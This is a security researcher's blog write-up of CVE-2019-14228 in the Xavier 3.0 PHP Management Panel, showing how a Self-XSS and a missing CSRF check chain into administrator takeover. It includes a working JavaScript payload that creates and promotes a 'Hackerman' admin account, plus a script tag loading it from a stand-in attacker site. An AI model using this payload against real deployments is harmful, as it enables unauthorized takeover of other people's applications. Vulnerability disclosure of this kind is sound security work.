---
layout: post
title:	"Xavier 3.0 PHP Management Panel CSRF to XSS to Application Takeover"
date:	2019-07-22 03:00:00
categories:
    - notes
tags:
    - bug_hunting
    - bug_writeup
---
<head>
	<title> Xavier 3.0 PHP Management Panel CSRF to XSS to Application Takeover </title>
</head>


<h2>CVE-2019-14228</h2>
~~~
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14228
~~~


# i. Introduction
In this post, I will detail my adventure of finding a bug with very low impact, and being able to leverage it into what essentially is an Application Takeover.

While hunting around on the application, I found a section where you can create users. After playing around, I noticed that when the registration would fail due to errors in the form such as a invalid username, too short password, etc, the username that you were trying to register would reflect on the error page.

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)

I then tried adding an XSS payload to see if the parameter would be sanitized in anyway. To my surprise, the parameter was not sanitized and I was able to trigger an XSS. 

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/xss.png)

However, this would be considered to be a `Self-XSS` which has very low impact as it requires social engineering in order to remotely exploit.


# ii. Chaining CSRF with XSS

Feeling a little defeated, I thought of some ways I could leverage this XSS into something bigger. While doing some more testing, I noticed that the endpoint which is responsible for creating the user did not have any CSRF protection. This gave me an idea to try to chain the Self-XSS with the CSRF to hopefully obtain remote exploitation.

Here is an example of how the request looks like:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf-payload.png)

~~~
Payload Used: <script>alert(1)</script>
~~~

After converting the request to a CSRF proof of concept, I put it to test:


![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf.gif)

It works, now we are able to remotely exploit a Self-XSS!

Do we stop here? No.


# iii. Application Takeover

Now that we are able to remotely exploit an XSS, what would be the impact? The obvious answer that comes to people's minds is stealing the session. However the application developers were one step ahead, and set the cookies to HTTPOnly. 

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/cookies.png)

The way that the application flow works when creating a new user is:
1. Register a new user
2. Find the user in the user list, click their name to edit their profile
3. Click the "promote to admin" button

If you are thinking, if we have a CSRF, why go through all the trouble of having to execute Javascript. Well according to the application flow, with a CSRF we would only be able to create a registered user. A registered user has the same privileges, if I would've registered on the application myself. Furthermore the endpoint which is in charge of elevating the user's privileges has CSRF protection.

With that in mind, I set off to find a way to be able to takeover the application chaining these two bugs.

I then wrote simple Javascript, when called will create a new user and then promote the user. This is able to bypass SOP, as the request will be called from the application. Furthermore this is also able to bypass the CSRF protection when promoting a user to the administrator as we can create an XMLHTTPRequest to parse the CSRF token and then include it with our subsequent request.

Host the following Javascript on your site:
~~~
var root = "";
var req = new XMLHttpRequest();
var url = root + "/xavier-demo/admin/includes/adminprocess.php";
var params = "user=Hackerman&firstname=Hackerman&lastname=Hackerman&pass=P4ssw0rd&conf_pass=P4ssw0rd& email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
var url2 = root + "/xavier-demo/admin/adminuseredit.php?usertoedit=Hackerman";
var regex = /delete-user" value="([^"]*?)"/g;
var req2 = new XMLHttpRequest();
req2.open("GET", url2, false);
req2.send();
var nonce = regex.exec(req2.responseText);
var nonce = nonce[1];
var url3 = root + "/xavier-demo/admin/includes/adminprocess.php";
var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=Hackerman&button=Promotetoadmin";
req2.open("POST", url3, true);
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req2.send(params2);
~~~

This will create a user with the username Hackerman, password: P4ssw0rd with Administrator privileges.

Then use a payload such as:
~~~
<script src="https://your-site.com/xavier.js"></script>
~~~

Create a CSRF proof of concept with the payload above, and host it on your site.

Executing the CSRF:

![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/takeover.gif)


So essentially with a Self-XSS and some creative thinking we were able to takeover an application. 


# iv. Conclusion

This was a great experience, and I've learned a lot. Remember when you have one piece of the puzzle, there are always ways to be able to leverage it into something bigger & greater. What normally would be treated as an informational bug, is able to be leveraged into something that can takeover the application.

As always, thank you for reading.

\- mqt

